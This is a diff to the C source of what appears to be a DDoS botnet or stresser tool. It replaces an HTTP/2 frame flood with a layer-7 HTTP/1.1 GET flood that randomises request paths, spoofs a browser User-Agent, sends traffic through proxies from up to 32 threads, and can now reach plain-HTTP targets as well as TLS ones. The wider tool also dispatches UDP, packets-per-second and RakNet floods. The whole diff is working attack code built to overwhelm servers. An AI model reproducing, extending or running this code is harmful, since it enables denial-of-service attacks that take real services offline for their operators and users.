@@ -318,39 +318,29 @@ static SSL *tls_handshake(int fd, const char *host) {
 	return ssl;
 }
 
-static void h2_flood(SSL *ssl, time_t end) {
-	static const unsigned char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
-	SSL_write(ssl, preface, (int)sizeof preface - 1);
-	unsigned char settings[9] = {0, 0, 0, 0, 4, 0, 0, 0, 0};
-	SSL_write(ssl, settings, 9);
-	unsigned int rnd = (unsigned int)time(NULL);
-	unsigned char frame[40];
+static void http11_get(int fd, SSL *ssl, const char *host, unsigned int *rnd, time_t end) {
 	while (time(NULL) < end) {
-		rnd = rnd * 1664525u + 1013904223u;
-		int off = 0;
-		frame[off++] = 0;
-		frame[off++] = 0;
-		frame[off++] = 4;
-		frame[off++] = 8;
-		frame[off++] = 0;
-		frame[off++] = 0;
-		frame[off++] = 0;
-		frame[off++] = 0;
-		frame[off++] = 0;
-		frame[off++] = 0;
-		frame[off++] = 0;
-		frame[off++] = 0;
-		frame[off++] = 1;
-		frame[off++] = (unsigned char)(rnd >> 24);
-		frame[off++] = (unsigned char)(rnd >> 16);
-		frame[off++] = (unsigned char)(rnd >> 8);
-		frame[off++] = (unsigned char)rnd;
-		if (SSL_write(ssl, frame, off) <= 0) {
+		*rnd = *rnd * 1664525u + 1013904223u;
+		char req[640];
+		int n = snprintf(req, sizeof req,
+			"GET /%08x?%08x HTTP/1.1\r\n"
+			"Host: %s\r\n"
+			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\r\n"
+			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+			"Accept-Language: en-US,en;q=0.5\r\n"
+			"Connection: keep-alive\r\n\r\n",
+			*rnd >> 16, *rnd, host);
+		if (n <= 0) {
 			break;
 		}
-		char buf[512];
-		if (SSL_read(ssl, buf, sizeof buf) <= 0) {
-			break;
+		if (ssl) {
+			if (SSL_write(ssl, req, n) <= 0) {
+				break;
+			}
+		} else {
+			if (write(fd, req, (size_t)n) < 0) {
+				break;
+			}
 		}
 	}
 }
@@ -360,11 +350,13 @@ typedef struct {
 	char port[16];
 	time_t end;
 	int use_proxy;
+	int use_tls;
 	int threads;
 } l7arg_t;
 
 static void *l7_worker(void *p) {
 	l7arg_t *a = p;
+	unsigned int rnd = (unsigned int)(size_t)p ^ (unsigned int)time(NULL);
 	while (time(NULL) < a->end) {
 		int fd = -1;
 		proxy_t *px = NULL;
@@ -388,25 +380,31 @@ static void *l7_worker(void *p) {
 				continue;
 			}
 		}
-		SSL *ssl = tls_handshake(fd, a->host);
-		if (!ssl) {
-			close(fd);
-			continue;
+		SSL *ssl = NULL;
+		if (a->use_tls) {
+			ssl = tls_handshake(fd, a->host);
+			if (!ssl) {
+				close(fd);
+				continue;
+			}
 		}
-		h2_flood(ssl, a->end);
-		SSL_free(ssl);
+		http11_get(fd, ssl, a->host, &rnd, a->end);
+		if (ssl) {
+			SSL_free(ssl);
+		}
 		close(fd);
 	}
 	(void)a->threads;
 	return NULL;
 }
 
-static void l7_attack(const char *host, const char *port, int secs, int use_proxy) {
+static void l7_attack(const char *host, const char *port, int secs, int use_proxy, int use_tls) {
 	l7arg_t arg;
 	snprintf(arg.host, sizeof arg.host, "%s", host);
 	snprintf(arg.port, sizeof arg.port, "%s", port);
 	arg.end = time(NULL) + secs;
 	arg.use_proxy = use_proxy;
+	arg.use_tls = use_tls;
 	arg.threads = 24;
 	if (!use_proxy) {
 		arg.threads = 32;
@@ -491,9 +489,12 @@ static void run_attack(const char *method, const char *host, const char *port, c
 	if (strcmp(method, "tls") == 0) {
 		load_proxies();
 		const char *h = host;
+		int use_tls = 1;
 		char hn[256];
-		if (strncmp(host, "https://", 8) == 0) {
-			snprintf(hn, sizeof hn, "%s", host + 8);
+		if (strncmp(host, "http", 4) == 0 && strstr(host, "://")) {
+			const char *scheme = strstr(host, "://");
+			use_tls = strncmp(host, "https", 5) == 0;
+			snprintf(hn, sizeof hn, "%s", scheme + 3);
 			char *slash = strchr(hn, '/');
 			if (slash) {
 				*slash = '\0';
@@ -504,12 +505,15 @@ static void run_attack(const char *method, const char *host, const char *port, c
 			}
 			h = hn;
 		}
-		l7_attack(h, port, secs, 1);
+		l7_attack(h, port, secs, 1, use_tls);
 	} else if (strcmp(method, "raw") == 0) {
 		const char *h = host;
+		int use_tls = 1;
 		char hn[256];
-		if (strncmp(host, "https://", 8) == 0) {
-			snprintf(hn, sizeof hn, "%s", host + 8);
+		if (strncmp(host, "http", 4) == 0 && strstr(host, "://")) {
+			const char *scheme = strstr(host, "://");
+			use_tls = strncmp(host, "https", 5) == 0;
+			snprintf(hn, sizeof hn, "%s", scheme + 3);
 			char *slash = strchr(hn, '/');
 			if (slash) {
 				*slash = '\0';
@@ -520,7 +524,7 @@ static void run_attack(const char *method, const char *host, const char *port, c
 			}
 			h = hn;
 		}
-		l7_attack(h, port, secs, 0);
+		l7_attack(h, port, secs, 0, use_tls);
 	} else if (strcmp(method, "udp") == 0 || strcmp(method, "pps") == 0 || strcmp(method, "raknet") == 0) {
 		udp_flood(host, port, secs, method);
 	}
